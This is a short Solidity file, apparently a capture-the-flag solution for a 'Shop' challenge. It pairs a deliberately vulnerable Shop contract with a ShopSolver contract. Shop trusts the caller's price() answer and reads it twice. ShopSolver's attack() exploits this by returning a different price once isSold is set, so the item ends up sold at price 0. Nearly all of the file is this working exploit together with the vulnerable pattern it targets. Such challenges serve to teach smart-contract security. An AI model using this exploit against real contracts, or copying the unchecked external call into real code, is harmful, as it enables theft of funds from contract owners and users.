// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract ShopSolver is Buyer {
    Shop public s_shop;

    constructor(address contractAddress) public {
        s_shop = Shop(contractAddress);
    }

    function attack() public {
        s_shop.buy();
    }

    function price() external view override returns (uint256) {
        if (s_shop.isSold()) {
            return 0;
        } else {
            return s_shop.price();
        }
    }
}
